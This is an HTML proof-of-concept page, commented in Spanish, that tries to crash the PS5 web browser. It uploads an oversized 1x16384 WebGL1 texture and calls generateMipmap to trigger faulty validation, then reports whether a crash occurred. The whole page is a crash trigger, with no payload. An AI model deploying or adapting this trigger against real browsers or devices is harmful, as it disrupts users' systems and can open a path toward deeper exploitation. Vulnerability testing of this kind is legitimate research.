<!DOCTYPE html>
<html>
<head>
  <title>WebGL1 Mipmap Crash PoC (PS5)</title>
  <style>body { background: #000; color: lime; font-family: monospace; }</style>
</head>
<body>
  <h1>WebGL1 Mipmap Crash PoC</h1>
  <p>Este test puede colapsar el navegador si es vulnerable.</p>
  <script>
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');

      if (!gl) {
        document.body.innerHTML += "<p style='color:red'>WebGL1 no disponible</p>";
        throw "WebGL1 no soportado.";
      }

      const texture = gl.createTexture();
      gl.bindTexture(gl.TEXTURE_2D, texture);

      const width = 1;
      const height = 16384; // tamaño exagerado vertical
      const data = new Uint8Array(width * height * 4); // RGBA

      // Forzamos una imagen 1x16384 para confundir el mipmapping
      gl.texImage2D(
        gl.TEXTURE_2D,
        0,
        gl.RGBA,
        width,
        height,
        0,
        gl.RGBA,
        gl.UNSIGNED_BYTE,
        data
      );

      gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_LINEAR);
      gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);

      // 💣 Este generateMipmap puede causar crash si hay validación incorrecta
      gl.generateMipmap(gl.TEXTURE_2D);

      document.body.innerHTML += "<p style='color:lime'>Mipmap generado sin crash</p>";

    } catch (e) {
      console.error(e);
      document.body.innerHTML += `<p style='color:red'>Error: ${e}</p>`;
    }
  </script>
</body>
</html>
